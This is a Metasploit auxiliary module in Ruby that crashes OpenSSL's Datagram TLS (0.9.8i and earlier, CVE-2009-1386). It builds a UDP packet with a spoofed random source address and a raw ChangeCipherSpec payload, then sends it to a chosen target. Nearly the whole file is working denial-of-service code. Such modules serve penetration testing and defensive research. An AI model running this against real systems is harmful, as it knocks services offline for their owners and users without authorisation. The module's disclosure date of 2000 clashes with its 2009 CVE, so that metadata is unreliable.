##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Dos
  include Msf::Exploit::Capture

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'OpenSSL DTLS ChangeCipherSpec Remote DoS',
      'Description'	=> %q{
          This module performs a Denial of Service Attack against Datagram TLS in OpenSSL
        version 0.9.8i and earlier. OpenSSL crashes under these versions when it receives a
        ChangeCipherspec Datagram before a ClientHello.
      },
      'Author'	=> [
            'Jon Oberheide <jon[at]oberheide.org>', #original code
            'theLightCosine' # metasploit module
            ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2009-1386' ],
          [ 'OSVDB', '55073'],
        ],
      'DisclosureDate' => '2000-04-26'))

    register_options([
        Opt::RPORT(80),
        Opt::RHOST
      ]
    )

    deregister_options('FILTER','PCAPFILE', 'INTERFACE', 'SNAPLEN', 'TIMEOUT')
  end

  def run
    open_pcap
    print_status("Creating DTLS ChangeCipherSpec Datagram...")
    p = PacketFu::UDPPacket.new
    p.ip_daddr = datastore['RHOST']
    p.ip_src = rand(0x100000000)
    p.ip_ttl = 44
    p.udp_sport = 34060
    p.udp_dport = datastore['RPORT'].to_i
    p.payload = "\x14\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01"
    p.recalc
    print_status("Sending Datagram to target...")
    capture_sendto(p, '255.255.255.255')
    close_pcap
  end
end
